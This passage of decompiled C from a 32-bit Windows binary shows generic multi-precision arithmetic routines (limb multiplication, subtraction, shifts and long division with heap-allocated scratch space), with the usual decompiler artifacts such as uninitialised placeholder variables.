    int32_t v6 = v5 & 0xffff; // 0x401ab6
    uint32_t v7 = v5 / 0x10000; // 0x401abc
    uint32_t v8 = v7 * v1; // 0x401abf
    uint32_t v9 = v6 * v1; // 0x401ac7
    int32_t v10 = v7 * v2; // 0x401acc
    uint32_t v11 = v6 * v2 + v8 + v9 / 0x10000; // 0x401ade
    uint32_t v12 = (v9 & 0xffff) + result + 0x10000 * v11; // 0x401aee
    result = (v11 >= v8 ? v10 : v10 + 0x10000) + v11 / 0x10000 + (int32_t)(v12 < result);
    int32_t v13; // 0x401a90
    *(int32_t *)v13 = v12;
    v3--;
    v13 += 4;
    v4 += 4;
    while (v3 != 0) {
        // 0x401ab2
        v5 = *(int32_t *)v4;
        v6 = v5 & 0xffff;
        v7 = v5 / 0x10000;
        v8 = v7 * v1;
        v9 = v6 * v1;
        v10 = v7 * v2;
        v11 = v6 * v2 + v8 + v9 / 0x10000;
        v12 = (v9 & 0xffff) + result + 0x10000 * v11;
        result = (v11 >= v8 ? v10 : v10 + 0x10000) + v11 / 0x10000 + (int32_t)(v12 < result);
        *(int32_t *)v13 = v12;
        v3--;
        v13 += 4;
        v4 += 4;
    }
    // 0x401b20
    return result;
}

// Address range: 0x401b30 - 0x401be2
int32_t function_401b30(int32_t a1, uint32_t a2, int32_t a3, int32_t a4) {
    int32_t v1 = a2 & 0xffff; // 0x401b3e
    uint32_t v2 = a2 / 0x10000; // 0x401b43
    int32_t result = 0; // 0x401b5b
    int32_t v3 = a1; // 0x401b5b
    int32_t v4; // 0x401b30
    int32_t v5; // 0x401b30
    int32_t v6; // 0x401b30
    uint32_t v7 = *(int32_t *)(v5 - v6 + v4); // 0x401b60
    int32_t v8 = v7 & 0xffff; // 0x401b68
    uint32_t v9 = v8 * v1; // 0x401b6b
    uint32_t v10 = v7 / 0x10000; // 0x401b71
    uint32_t v11 = v10 * v1; // 0x401b74
    int32_t v12 = v10 * v2; // 0x401b77
    uint32_t v13 = v8 * v2 + v11 + v9 / 0x10000; // 0x401b81
    uint32_t v14 = (v9 & 0xffff) + result + 0x10000 * v13; // 0x401b9a
    int32_t v15 = v13 >= v11 ? v12 : v12 + 0x10000; // 0x401ba1
    int32_t * v16 = (int32_t *)v4; // 0x401bb6
    uint32_t v17 = *v16;
    *v16 = v17 - v14;
    result = v15 + v13 / 0x10000 + (int32_t)(v14 < result) + (int32_t)(v17 < v14);
    v3--;
    v4 += 4;
    while (v3 != 0) {
        // 0x401b60
        v7 = *(int32_t *)(v5 - v6 + v4);
        v8 = v7 & 0xffff;
        v9 = v8 * v1;
        v10 = v7 / 0x10000;
        v11 = v10 * v1;
        v12 = v10 * v2;
        v13 = v8 * v2 + v11 + v9 / 0x10000;
        v14 = (v9 & 0xffff) + result + 0x10000 * v13;
        v15 = v13 >= v11 ? v12 : v12 + 0x10000;
        v16 = (int32_t *)v4;
        v17 = *v16;
        *v16 = v17 - v14;
        result = v15 + v13 / 0x10000 + (int32_t)(v14 < result) + (int32_t)(v17 < v14);
        v3--;
        v4 += 4;
    }
    // 0x401bd9
    return result;
}

// Address range: 0x401bf0 - 0x401d02
int32_t function_401bf0(int32_t a1, int32_t a2, int32_t a3) {
    // 0x401bf0
    int32_t v1; // 0x401bf0
    int32_t v2; // 0x401bf0
    int32_t v3; // 0x401bf0
    int32_t v4 = function_401a90(a1, *(int32_t *)a2, v1, v2, v3); // 0x401c05
    int32_t v5 = 4 * a1; // 0x401c16
    int32_t v6; // 0x401bf0
    *(int32_t *)(v6 + v5) = v4;
    int32_t v7 = v6 + 4; // 0x401c19
    int32_t v8 = a3 - 1; // 0x401c1f
    if (v8 < 1) {
        // 0x401cf7
        return *(int32_t *)(v5 - 4 + v7);
    }
    int32_t v9 = a2; // 0x401c31
    int32_t v10 = v8; // 0x401c31
    int32_t v11 = v7; // 0x401c31
    int32_t v12; // 0x401bf0
    int32_t v13 = v12 - v7; // 0x401c31
    v9 += 4;
    uint32_t v14 = *(int32_t *)v9; // 0x401c34
    int32_t v15 = v14 & 0xffff; // 0x401c40
    uint32_t v16 = v14 / 0x10000; // 0x401c50
    int32_t v17 = a1; // 0x401c50
    int32_t v18 = v11; // 0x401c50
    int32_t v19 = 0; // 0x401c50
    uint32_t v20 = *(int32_t *)(v18 + v13); // 0x401c53
    int32_t v21 = v20 & 0xffff; // 0x401c58
    uint32_t v22 = v20 / 0x10000; // 0x401c5d
    uint32_t v23 = v21 * v15; // 0x401c62
    uint32_t v24 = v22 * v15; // 0x401c65
    int32_t v25 = v22 * v16; // 0x401c68
    uint32_t v26 = v21 * v16 + v24 + v23 / 0x10000; // 0x401c77
    uint32_t v27 = (v23 & 0xffff) + v19 + 0x10000 * v26; // 0x401c8a
    int32_t v28 = v26 >= v24 ? v25 : v25 + 0x10000; // 0x401c9a
    int32_t * v29 = (int32_t *)v18; // 0x401cb1
    uint32_t v30 = *v29;
    uint32_t v31 = v27 + v30; // 0x401cb1
    *v29 = v31;
    int32_t v32 = v28 + v26 / 0x10000 + (int32_t)(v27 < v19) + (int32_t)(v31 < v30); // 0x401cc1
    v17--;
    v18 += 4;
    v19 = v32;
    while (v17 != 0) {
        // 0x401c53
        v20 = *(int32_t *)(v18 + v13);
        v21 = v20 & 0xffff;
        v22 = v20 / 0x10000;
        v23 = v21 * v15;
        v24 = v22 * v15;
        v25 = v22 * v16;
        v26 = v21 * v16 + v24 + v23 / 0x10000;
        v27 = (v23 & 0xffff) + v19 + 0x10000 * v26;
        v28 = v26 >= v24 ? v25 : v25 + 0x10000;
        v29 = (int32_t *)v18;
        v30 = *v29;
        v31 = v27 + v30;
        *v29 = v31;
        v32 = v28 + v26 / 0x10000 + (int32_t)(v27 < v19) + (int32_t)(v31 < v30);
        v17--;
        v18 += 4;
        v19 = v32;
    }
    // 0x401ccf
    *(int32_t *)(v11 + v5) = v32;
    v11 += 4;
    v10--;
    v13 -= 4;
    while (v10 != 0) {
        // 0x401c34
        v9 += 4;
        v14 = *(int32_t *)v9;
        v15 = v14 & 0xffff;
        v16 = v14 / 0x10000;
        v17 = a1;
        v18 = v11;
        v19 = 0;
        v20 = *(int32_t *)(v18 + v13);
        v21 = v20 & 0xffff;
        v22 = v20 / 0x10000;
        v23 = v21 * v15;
        v24 = v22 * v15;
        v25 = v22 * v16;
        v26 = v21 * v16 + v24 + v23 / 0x10000;
        v27 = (v23 & 0xffff) + v19 + 0x10000 * v26;
        v28 = v26 >= v24 ? v25 : v25 + 0x10000;
        v29 = (int32_t *)v18;
        v30 = *v29;
        v31 = v27 + v30;
        *v29 = v31;
        v32 = v28 + v26 / 0x10000 + (int32_t)(v27 < v19) + (int32_t)(v31 < v30);
        v17--;
        v18 += 4;
        v19 = v32;
        while (v17 != 0) {
            // 0x401c53
            v20 = *(int32_t *)(v18 + v13);
            v21 = v20 & 0xffff;
            v22 = v20 / 0x10000;
            v23 = v21 * v15;
            v24 = v22 * v15;
            v25 = v22 * v16;
            v26 = v21 * v16 + v24 + v23 / 0x10000;
            v27 = (v23 & 0xffff) + v19 + 0x10000 * v26;
            v28 = v26 >= v24 ? v25 : v25 + 0x10000;
            v29 = (int32_t *)v18;
            v30 = *v29;
            v31 = v27 + v30;
            *v29 = v31;
            v32 = v28 + v26 / 0x10000 + (int32_t)(v27 < v19) + (int32_t)(v31 < v30);
            v17--;
            v18 += 4;
            v19 = v32;
        }
        // 0x401ccf
        *(int32_t *)(v11 + v5) = v32;
        v11 += 4;
        v10--;
        v13 -= 4;
    }
    // 0x401cf7
    return *(int32_t *)(v5 - 4 + v11);
}

// Address range: 0x401d10 - 0x401d8a
int32_t function_401d10(int32_t a1, int32_t a2) {
    int32_t v1 = 4 * a1; // 0x401d1f
    int32_t v2; // 0x401d10
    int32_t v3 = v1 - 4 + v2; // 0x401d26
    int32_t v4; // 0x401d10
    int32_t v5 = v4 + v1; // 0x401d28
    uint32_t v6 = *(int32_t *)v3; // 0x401d36
    uint32_t v7 = -a2 & 31; // 0x401d3a
    int32_t result = v6 >> v7;
    uint32_t v8 = a2 & 31; // 0x401d3f
    int32_t v9 = v6 << v8;
    int32_t v10 = a1 - 1; // 0x401d41
    int32_t v11 = v10; // 0x401d4a
    int32_t v12 = v3; // 0x401d4a
    if (v10 == 0) {
        // 0x401d7e
        *(int32_t *)(v5 - 4) = v9;
        return result;
    }
    int32_t v13 = v5;
    v12 -= 4;
    uint32_t v14 = *(int32_t *)v12; // 0x401d50
    int32_t v15 = v13 - 4; // 0x401d59
    *(int32_t *)v15 = v14 >> v7 | v9;
    int32_t v16 = v14 << v8;
    v11--;
    while (v11 != 0) {
        // 0x401d50
        v13 = v15;
        v12 -= 4;
        v14 = *(int32_t *)v12;
        v15 = v13 - 4;
        *(int32_t *)v15 = v14 >> v7 | v16;
        v16 = v14 << v8;
        v11--;
    }
    // 0x401d71
    *(int32_t *)(v13 - 8) = v16;
    return result;
}

// Address range: 0x401d90 - 0x401df8
int32_t function_401d90(int32_t a1, int32_t a2) {
    uint32_t v1 = -a2 & 31; // 0x401daf
    uint32_t v2; // 0x401d90
    int32_t result = v2 << v1;
    uint32_t v3 = a2 & 31; // 0x401db4
    int32_t v4 = v2 >> v3;
    int32_t v5 = a1 - 1; // 0x401db6
    int32_t v6 = v5; // 0x401dbd
    if (v5 == 0) {
        // 0x401ded
        int32_t v7; // 0x401d90
        *(int32_t *)v7 = v4;
        return result;
    }
    int32_t v8; // 0x401d90
    int32_t v9 = v8 + 4;
    uint32_t v10 = *(int32_t *)v9; // 0x401dc0
    int32_t v11; // 0x401d90
    int32_t v12 = v11 + 4; // 0x401dc8
    *(int32_t *)v11 = v10 << v1 | v4;
    int32_t v13 = v10 >> v3;
    v6--;
    v11 = v12;
    while (v6 != 0) {
        // 0x401dc0
        v9 += 4;
        v10 = *(int32_t *)v9;
        v12 = v11 + 4;
        *(int32_t *)v11 = v10 << v1 | v13;
        v13 = v10 >> v3;
        v6--;
        v11 = v12;
    }
    // 0x401de1
    *(int32_t *)v12 = v13;
    return result;
}

// Address range: 0x401e00 - 0x401f6a
int32_t function_401e00(void) {
    // 0x401e00
    uint32_t v1; // 0x401e00
    uint32_t v2 = v1 ^ -1; // 0x401e12
    uint32_t v3 = v1 / 0x10000; // 0x401e14
    int32_t v4 = v2 / v3;
    uint32_t v5 = v4 * (v1 & 0xffff); // 0x401e24
    int32_t v6 = 0x10000 * (v2 - v4 * v3) | 0xffff; // 0x401e2f
    int32_t v7 = v4; // 0x401e37
    int32_t v8 = v6; // 0x401e37
    if (v6 < v5) {
        uint32_t v9 = v6 + v1; // 0x401e39
        v7 = v4 - 1;
        v8 = v9;
        if (v9 >= v1 && v9 < v5) {
            // 0x401e44
            v7 = v4 - 2;
            v8 = v9 + v1;
        }
    }
    uint32_t v10 = v8 - v5; // 0x401e47
    uint32_t v11 = v10 / 0x10000 * v7 + v10; // 0x401e51
    uint32_t v12 = v11 / 0x10000; // 0x401e5b
    int32_t v13 = v12 + 1; // 0x401e61
    uint32_t v14 = 0x10000 * v10 - v13 * v1 + 0xffff;
    uint32_t v15 = (v14 < 0x10000 * v11 ? 0 : v1) + v14;
    int32_t v16 = v14 < 0x10000 * v11 ? v13 : v12; // 0x401e86
    int32_t result = v16 + 0x10000 * v7 + (int32_t)(v15 >= v1); // 0x401e94
    uint32_t v17; // 0x401e00
    if (v17 == 0) {
        // 0x401f57
        return result;
    }
    uint32_t v18 = v17 + (v15 ^ -1) + (v15 < v1 ? 0 : v1); // 0x401ead
    int32_t v19 = v18; // 0x401eb7
    int32_t result2 = result; // 0x401eb7
    if (v18 < v17) {
        // 0x401eb9
        v19 = v18 - v1 + (v18 < v1 ? 0 : -v1);
        result2 = result - 2 + (int32_t)(v18 < v1);
    }
    int32_t v20 = v17 & 0xffff; // 0x401ed3
    int32_t v21 = result2 & 0xffff; // 0x401ed8
    uint32_t v22 = v17 / 0x10000; // 0x401edd
    uint32_t v23 = v21 * v20;
    uint32_t v24 = result2 / 0x10000; // 0x401ee3
    uint32_t v25 = v21 * v22;
    int32_t v26 = v24 * v22;
    uint32_t v27 = v24 * v20 + v25 + v23 / 0x10000; // 0x401efc
    uint32_t v28 = (v27 >= v25 ? v26 : v26 + 0x10000) + v27 / 0x10000; // 0x401f14
    uint32_t v29 = v28 + v19; // 0x401f16
    if (v29 >= v28) {
        // 0x401f57
        return result2;
    }
    int32_t v30 = v17 < (0x10000 * v27 | v23 & 0xffff) == v29 == v1 | v29 > v1 ? -2 : -1; // 0x401f4d
    return v30 + result2;
}

// Address range: 0x401f70 - 0x402044
int32_t function_401f70(int32_t a1, int32_t a2) {
    int32_t v1 = 0; // 0x401f8a
    int32_t v2 = 0; // 0x401f8a
    int32_t v3; // 0x401f70
    uint32_t v4; // 0x401f70
    if (v4 < 0x1000000) {
        int32_t v5; // 0x401f70
        int32_t v6 = v5;
        int32_t v7 = 256 * v6; // 0x401f90
        v1 += 8;
        v3 = v7;
        v2 = v1;
        while ((v6 & 0xff0000) == 0) {
            // 0x401f90
            v6 = v7;
            v7 = 256 * v6;
            v1 += 8;
            v3 = v7;
            v2 = v1;
        }
    }
    int32_t v8 = v3; // 0x401f9f
    int32_t v9 = v2; // 0x401f9f
    int32_t v10 = v2; // 0x401f9f
    if (v3 >= 0) {
        v9++;
        v8 *= 2;
        v10 = v9;
        while (v8 >= 0) {
            // 0x401fa1
            v9++;
            v8 *= 2;
            v10 = v9;
        }
    }
    uint32_t v11 = v4 << (v10 & 31);
    int32_t result; // 0x401f70
    *(int32_t *)result = v10;
    uint32_t v12 = v11 ^ -1; // 0x401fac
    *(int32_t *)(result + 4) = v11;
    uint32_t v13 = v11 / 0x10000; // 0x401fb5
    int32_t v14 = v12 / v13;
    uint32_t v15 = (v11 & 0xffff) * v14; // 0x401fc3
    int32_t v16 = 0x10000 * (v12 - v14 * v13) | 0xffff; // 0x401fce
    int32_t v17 = v14; // 0x401fd6
    int32_t v18 = v16; // 0x401fd6
    if (v16 < v15) {
        uint32_t v19 = v16 + v11; // 0x401fd8
        v17 = v14 - 1;
        v18 = v19;
        if (v19 >= v11 && v19 < v15) {
            // 0x401fe3
            v17 = v14 - 2;
            v18 = v19 + v11;
        }
    }
    uint32_t v20 = v18 - v15; // 0x401fe6
    uint32_t v21 = v20 / 0x10000 * v17 + v20; // 0x401ff0
    uint32_t v22 = v21 / 0x10000; // 0x401ffa
    int32_t v23 = v22 + 1; // 0x401ffd
    uint32_t v24 = 0x10000 * v20 - v23 * v11 + 0xffff; // 0x402008
    int32_t v25 = v24 < 0x10000 * v21 ? 0 : v11;
    int32_t v26 = v24 < 0x10000 * v21 ? v23 : v22; // 0x402025
    *(int32_t *)(result + 12) = v26 + 0x10000 * v17 + (int32_t)(v25 + v24 >= v11);
    return result;
}

// Address range: 0x402050 - 0x40214e
int32_t function_402050(int32_t a1) {
    // 0x402050
    if (a1 == 1) {
        // 0x402064
        int32_t v1; // 0x402050
        int32_t v2; // 0x402050
        return function_401f70(v1, v2);
    }
    uint32_t v3; // 0x402050
    int32_t v4; // 0x402050
    if (a1 == 2) {
        int32_t v5 = *(int32_t *)(v3 + 4); // 0x40207b
        int32_t v6 = 0; // 0x402086
        int32_t v7 = v5; // 0x402086
        int32_t v8 = 0; // 0x402086
        if (v5 < 0x1000000) {
            int32_t v9 = v5;
            int32_t v10 = 256 * v9; // 0x402090
            v6 += 8;
            v7 = v10;
            v8 = v6;
            while ((v9 & 0xff0000) == 0) {
                // 0x402090
                v9 = v10;
                v10 = 256 * v9;
                v6 += 8;
                v7 = v10;
                v8 = v6;
            }
        }
        int32_t v11 = v7; // 0x40209f
        int32_t v12 = v8; // 0x40209f
        int32_t v13 = v8; // 0x40209f
        if (v7 >= 0) {
            v12++;
            v11 *= 2;
            v13 = v12;
            while (v11 >= 0) {
                // 0x4020a1
                v12++;
                v11 *= 2;
                v13 = v12;
            }
        }
        // 0x4020a6
        *(int32_t *)v4 = v13;
        int32_t v14 = v5; // 0x4020aa
        int32_t v15; // 0x402050
        if (v13 != 0) {
            uint32_t v16 = v13 & 31; // 0x4020b9
            v15 = v3 << v16;
            v14 = v5 << v16 | v3 >> (-v13 & 31);
        }
        // 0x4020bf
        *(int32_t *)(v4 + 4) = v14;
        *(int32_t *)(v4 + 8) = v15;
        int32_t result = function_401e00(); // 0x4020c7
        *(int32_t *)(v4 + 12) = result;
        return result;
    }
    int32_t v17 = v3 + 4 * a1;
    int32_t v18 = *(int32_t *)(v17 - 4); // 0x4020d6
    uint32_t v19 = *(int32_t *)(v17 - 8); // 0x4020da
    int32_t v20 = v18; // 0x4020ec
    int32_t v21 = 0; // 0x4020ec
    if (v18 < 0x1000000) {
        int32_t v22 = v18;
        int32_t v23 = 256 * v22; // 0x4020f0
        int32_t v24 = 8; // 0x4020f3
        int32_t v25 = v24; // 0x4020fb
        v20 = v23;
        v21 = v24;
        while ((v22 & 0xff0000) == 0) {
            // 0x4020f0
            v22 = v23;
            v23 = 256 * v22;
            v24 = v25 + 8;
            v25 = v24;
            v20 = v23;
            v21 = v24;
        }
    }
    int32_t v26 = v21; // 0x4020ff
    if (v20 >= 0) {
        int32_t v27 = v21 + 1; // 0x402101
        int32_t v28 = 2 * v20; // 0x402102
        int32_t v29 = v28; // 0x402104
        int32_t v30 = v27; // 0x402104
        v26 = v27;
        while (v28 >= 0) {
            // 0x402101
            v27 = v30 + 1;
            v28 = 2 * v29;
            v29 = v28;
            v30 = v27;
            v26 = v27;
        }
    }
    // 0x402106
    *(int32_t *)v4 = v26;
    int32_t v31 = v18; // 0x40210a
    int32_t v32 = v19; // 0x40210a
    if (v26 != 0) {
        uint32_t v33 = -v26 & 31; // 0x402118
        uint32_t v34 = v26 & 31; // 0x40211c
        v31 = v18 << v34 | v19 >> v33;
        v32 = *(int32_t *)(v17 - 12) >> v33 | v19 << v34;
    }
    // 0x402139
    *(int32_t *)(v4 + 4) = v31;
    *(int32_t *)(v4 + 8) = v32;
    int32_t result2 = function_401e00(); // 0x40213f
    *(int32_t *)(v4 + 12) = result2;
    return result2;
}

// Address range: 0x402150 - 0x4022b6
int32_t function_402150(uint32_t a1, int32_t a2) {
    int32_t * v1 = (int32_t *)a2; // 0x40216c
    int32_t v2 = 0; // 0x40216f
    int32_t v3; // bp-56, 0x402150
    int32_t * v4 = &v3; // 0x40216f
    int32_t v5 = 0; // 0x40216f
    int32_t v6; // 0x402150
    if (*v1 != 0) {
        int32_t * hHeap = GetProcessHeap(); // 0x40217b
        int32_t v7 = (int32_t)hHeap; // bp-68, 0x402181
        v2 = (int32_t)HeapAlloc(hHeap, (int32_t)&g266, (int32_t)&g266);
        v5 = function_401d10(a1, *v1);
        v6 = v2;
        v4 = &v7;
    }
    uint32_t v8 = *(int32_t *)(a2 + 4); // 0x4021a7
    uint32_t v9 = *(int32_t *)(a2 + 12); // 0x4021ad
    int32_t v10 = v5; // 0x4021b8
    if (a1 >= 1) {
        int32_t v11 = v9 & 0xffff; // 0x4021c0
        uint32_t v12 = v9 / 0x10000; // 0x4021c3
        int32_t v13 = a1; // 0x4021d1
        int32_t v14; // 0x402150
        int32_t v15 = v14 + 4 * a1 - 4; // 0x4021d4
        int32_t v16 = v5 & 0xffff; // 0x4021d7
        uint32_t v17 = v5 / 0x10000; // 0x4021e8
        uint32_t v18 = v17 * v11; // 0x4021eb
        int32_t v19 = v17 * v12; // 0x4021ee
        uint32_t v20 = v16 * v11; // 0x4021f7
        uint32_t v21 = v16 * v12 + v18 + v20 / 0x10000; // 0x402207
        uint32_t v22 = 0x10000 * v21 | v20 & 0xffff; // 0x402215
        int32_t v23 = *(int32_t *)(v6 - v14 + v15); // 0x40221a
        uint32_t v24 = v22 + v23; // 0x402226
        int32_t v25 = v21 / 0x10000 + v5 + (v21 >= v18 ? v19 : v19 + 0x10000) + (v24 < v22 ? 2 : 1); // 0x402243
        uint32_t v26 = v23 - v25 * v8; // 0x402251
        int32_t v27 = v24 < v26; // 0x402255
        uint32_t v28 = (v8 & v27) + v26; // 0x40225f
        if (v14 != 0) {
            // 0x402273
            *(int32_t *)v15 = v25 + v27 + (int32_t)(v28 >= v8);
        }
        // 0x402280
        v13--;
        int32_t v29 = v28 - (v28 < v8 ? 0 : v8); // 0x402267
        int32_t v30 = v15; // 0x402288
        v10 = v29;
        while (v13 >= 0 == (v13 != 0)) {
            // 0x4021d4
            v15 = v30 - 4;
            v16 = v29 & 0xffff;
            v17 = v29 / 0x10000;
            v18 = v17 * v11;
            v19 = v17 * v12;
            v20 = v16 * v11;
            v21 = v16 * v12 + v18 + v20 / 0x10000;
            v22 = 0x10000 * v21 | v20 & 0xffff;
            v23 = *(int32_t *)(v6 - v14 + v15);
            v24 = v22 + v23;
            v25 = v21 / 0x10000 + v29 + (v21 >= v18 ? v19 : v19 + 0x10000) + (v24 < v22 ? 2 : 1);
            v26 = v23 - v25 * v8;
            v27 = v24 < v26;
            v28 = (v8 & v27) + v26;
            if (v14 != 0) {
                // 0x402273
                *(int32_t *)v15 = v25 + v27 + (int32_t)(v28 >= v8);
            }
            // 0x402280
            v13--;
            v29 = v28 - (v28 < v8 ? 0 : v8);
            v30 = v15;
            v10 = v29;
        }
    }
    int32_t v31 = 0; // 0x402295
    if (*v1 != 0) {
        int32_t v32 = (int32_t)v4;
        *(int32_t *)(v32 - 4) = v2;
        *(int32_t *)(v32 - 8) = 0;
        *(int32_t *)(v32 - 12) = (int32_t)GetProcessHeap();
        HeapFree(&g266, (int32_t)&g266, &g266);
        v31 = *v1 & 31;
    }
    // 0x4022ab
    return v10 >> v31;
}

// Address range: 0x4022c0 - 0x40234c
int32_t function_4022c0(int32_t a1) {
    // 0x4022c0
    uint32_t v1; // 0x4022c0
    int32_t v2; // 0x4022c0
    if (v2 == 0) {
        // 0x402345
        return v1 & 1;
    }
    int32_t v3 = (uint32_t)(v1 / 2);
    int32_t v4 = a1 - 1; // 0x402311
    int32_t v5 = v3; // 0x402314
    int32_t v6; // 0x4022c0
    if (v4 != 0) {
        int32_t v7 = v4; // 0x40231e
        int32_t v8; // 0x4022c0
        int32_t v9 = v8 + 4;
        uint32_t v10 = *(int32_t *)(v1 - v2 + v9); // 0x402320
        *(int32_t *)v8 = 0x80000000 * v10 | v3;
        int32_t v11 = v10 / 2;
        v7--;
        v8 = v9;
        v6 = v9;
        v5 = v11;
        while (v7 != 0) {
            // 0x402320
            v9 = v8 + 4;
            v10 = *(int32_t *)(v1 - v2 + v9);
            *(int32_t *)v8 = 0x80000000 * v10 | v11;
            v11 = v10 / 2;
            v7--;
            v8 = v9;
            v6 = v9;
            v5 = v11;
        }
    }
    // 0x402340
    *(int32_t *)v6 = v5;
    // 0x402345
    return v1 & 1;
}

// Address range: 0x402350 - 0x402595
int32_t function_402350(int32_t a1, int32_t a2, int32_t a3) {
    uint32_t v1 = *(int32_t *)(a3 + 4); // 0x402360
    uint32_t v2 = *(int32_t *)(a3 + 8); // 0x402363
    int32_t v3 = *(int32_t *)a3; // 0x402367
    uint32_t v4 = *(int32_t *)(a3 + 12); // 0x402369
    int32_t v5; // bp-76, 0x402350
    int32_t * v6 = &v5; // 0x402384
    int32_t v7 = a1; // 0x402384
    int32_t v8 = 0; // 0x402384
    if (v3 != 0) {
        int32_t * hHeap = GetProcessHeap(); // 0x402393
        int32_t v9 = (int32_t)hHeap; // bp-88, 0x402399
        v7 = (int32_t)HeapAlloc(hHeap, (int32_t)&g266, (int32_t)&g266);
        v8 = function_401d10(a2, v3);
        v6 = &v9;
    }
    int32_t v10 = a2 - 2; // 0x4023d1
    uint32_t v11 = v4 / 0x10000; // 0x4023d4
    int32_t v12 = v4 & 0xffff;
    int32_t v13 = v2 & 0xffff; // 0x4023e0
    uint32_t v14 = v2 / 0x10000; // 0x4023e3
    int32_t v15 = v10; // 0x4023fd
    int32_t result = *(int32_t *)(4 * a2 - 4 + v7); // 0x4023fd
    int32_t v16; // 0x402350
    int32_t v17 = v16 + 4 * v10;
    uint32_t v18 = *(int32_t *)(v7 - v16 + v17); // 0x402400
    uint32_t v19 = v8 / 0x10000; // 0x402408
    uint32_t v20 = v19 * v12; // 0x40240b
    int32_t v21 = v19 * v11; // 0x402414
    int32_t v22 = v8 & 0xffff; // 0x40241a
    uint32_t v23 = v22 * v12; // 0x402423
    uint32_t v24 = v22 * v11 + v20 + v23 / 0x10000; // 0x40242d
    uint32_t v25 = 0x10000 * v24 | v23 & 0xffff; // 0x402449
    uint32_t v26 = v25 + result; // 0x40244e
    int32_t v27 = v24 / 0x10000 + v8 + (v24 >= v20 ? v21 : v21 + 0x10000);
    uint32_t v28 = v27 + (int32_t)(v26 < v25); // 0x40245e
    int32_t v29 = v28 & 0xffff; // 0x40246d
    int32_t v30 = (v26 < v25 ? 2 : 1) + v27; // 0x402478
    uint32_t v31 = v18 - v2; // 0x402486
    uint32_t v32 = v28 / 0x10000; // 0x402493
    int32_t v33 = v32 * v14; // 0x40249e
    uint32_t v34 = v29 * v13; // 0x4024a7
    uint32_t v35 = v29 * v14; // 0x4024ab
    uint32_t v36 = v32 * v13 + v35 + v34 / 0x10000; // 0x4024b9
    uint32_t v37 = 0x10000 * v36 | v34 & 0xffff; // 0x4024c6
    int32_t v38 = v36 >= v35 ? v33 : v33 + 0x10000; // 0x4024ca
    uint32_t v39 = result + (int32_t)(v18 < v2) + -1 * v30 * v1 - v36 / 0x10000 - v38 + (int32_t)(v31 < v37); // 0x4024e1
    uint32_t v40 = v31 - v37; // 0x4024e6
    int32_t v41 = v39 >= v26; // 0x4024f2
    int32_t v42 = v30 + v41; // 0x4024f5
    uint32_t v43 = (v2 & v41) + v40; // 0x4024f9
    int32_t v44 = (v1 & v41) + v39 + (int32_t)(v43 < v40); // 0x402509
    int32_t v45 = v44; // 0x402510
    int32_t v46 = v43; // 0x402510
    int32_t v47 = v42; // 0x402510
    if (v44 >= v1) {
        // 0x402512
        v45 = v44;
        v46 = v43;
        v47 = v42;
        if (v43 < v2 != v44 <= v1) {
            // 0x402518
            v45 = (int32_t)(v43 < v2) - v1 + v44;
            v46 = v43 - v2;
            v47 = v42 + 1;
        }
    }
    // 0x402528
    result = v46;
    int32_t v48 = v45;
    if (v16 != 0) {
        // 0x402531
        *(int32_t *)v17 = v47;
    }
    // 0x402533
    v15--;
    int32_t v49 = v17 - 4; // 0x402545
    while (v15 >= 0) {
        // 0x402400
        v17 = v49;
        v18 = *(int32_t *)(v7 - v16 + v17);
        v19 = v48 / 0x10000;
        v20 = v19 * v12;
        v21 = v19 * v11;
        v22 = v48 & 0xffff;
        v23 = v22 * v12;
        v24 = v22 * v11 + v20 + v23 / 0x10000;
        v25 = 0x10000 * v24 | v23 & 0xffff;
        v26 = v25 + result;
        v27 = v24 / 0x10000 + v48 + (v24 >= v20 ? v21 : v21 + 0x10000);
        v28 = v27 + (int32_t)(v26 < v25);
        v29 = v28 & 0xffff;
        v30 = (v26 < v25 ? 2 : 1) + v27;
        v31 = v18 - v2;
        v32 = v28 / 0x10000;
        v33 = v32 * v14;
        v34 = v29 * v13;
        v35 = v29 * v14;
        v36 = v32 * v13 + v35 + v34 / 0x10000;
        v37 = 0x10000 * v36 | v34 & 0xffff;
        v38 = v36 >= v35 ? v33 : v33 + 0x10000;
        v39 = result + (int32_t)(v18 < v2) + -1 * v30 * v1 - v36 / 0x10000 - v38 + (int32_t)(v31 < v37);
        v40 = v31 - v37;
        v41 = v39 >= v26;
        v42 = v30 + v41;
        v43 = (v2 & v41) + v40;
        v44 = (v1 & v41) + v39 + (int32_t)(v43 < v40);
        v45 = v44;
        v46 = v43;
        v47 = v42;
        if (v44 >= v1) {
            // 0x402512
            v45 = v44;
            v46 = v43;
            v47 = v42;
            if (v43 < v2 != v44 <= v1) {
                // 0x402518
                v45 = (int32_t)(v43 < v2) - v1 + v44;
                v46 = v43 - v2;
                v47 = v42 + 1;
            }
        }
        // 0x402528
        result = v46;
        v48 = v45;
        if (v16 != 0) {
            // 0x402531
            *(int32_t *)v17 = v47;
        }
        // 0x402533
        v15--;
        v49 = v17 - 4;
    }
    int32_t result2; // 0x402350
    if (v3 == 0) {
        // 0x402586
        *(int32_t *)(result2 + 4) = v48;
        *(int32_t *)result2 = result;
        return result;
    }
    int32_t v50 = (int32_t)v6;
    *(int32_t *)(v50 - 4) = v7;
    uint32_t v51 = v3 & 31; // 0x402562
    *(int32_t *)(v50 - 8) = 0;
    *(int32_t *)(v50 - 12) = (int32_t)GetProcessHeap();
    HeapFree(&g266, (int32_t)&g266, &g266);
    *(int32_t *)result2 = result >> v51 | v48 << (-v3 & 31);
    *(int32_t *)(result2 + 4) = v48 >> v51;
    return result2;
}

// Address range: 0x4025a0 - 0x402821
int32_t function_4025a0(int32_t a1, int32_t a2, int32_t a3, int32_t a4, uint32_t a5) {
    int32_t result = 4 * a4; // 0x4025b1
    int32_t v1 = result - 4; // 0x4025bb
    uint32_t v2 = *(int32_t *)(v1 + a3); // 0x4025bb
    uint32_t v3 = *(int32_t *)(a3 - 8 + result); // 0x4025bf
    int32_t v4; // bp-72, 0x4025a0
    int32_t v5 = &v4; // 0x4025cc
    int32_t v6 = a1 - a4; // 0x4025d7
    int32_t v7; // 0x4025a0
    int32_t v8 = v7 + 4 * a1;
    int32_t v9 = a5 & 0xffff;
    uint32_t v10 = a5 / 0x10000;
    uint32_t v11 = v3 / 0x10000;
    int32_t v12 = v3 & 0xffff;
    int32_t * v13 = (int32_t *)(v5 - 4);
    int32_t * v14 = (int32_t *)(v5 - 8);
    uint32_t v15 = a4 - 1;
    int32_t v16 = v8; // 0x402602
    int32_t v17 = v8 - 8;
    int32_t v18 = v7 + 4 * v6;
    v16 -= 4;
    int32_t * v19 = (int32_t *)v16; // 0x402605
    int32_t v20 = *v19; // 0x402605
